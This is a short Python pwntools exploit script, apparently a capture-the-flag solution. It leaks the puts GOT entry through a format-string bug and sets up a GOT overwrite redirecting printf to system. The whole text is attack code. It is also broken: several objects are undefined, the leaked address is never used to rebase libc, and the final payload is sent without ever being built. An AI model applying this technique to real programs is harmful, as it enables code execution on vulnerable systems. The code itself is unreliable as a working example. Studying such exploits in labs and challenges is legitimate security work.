from pwn import *

payload = p32(elf.got['puts']) + b"%4$s"

r.recvuntil(b'pace> ')
r.sendline(payload)

r.recvuntil(p32(elf.got['puts'])) 
leaked_bytes = r.recv(4)
puts_real_addr = u32(leaked_bytes)

system_addr = libc.symbols['system']

print(system_addr)
r.recvuntil(b"/n)\n")
r.sendline(b"y")

r.recvuntil(b'pace> ')

writes = {elf.got['printf']: system_addr}

r.sendline(overwrite_payload)
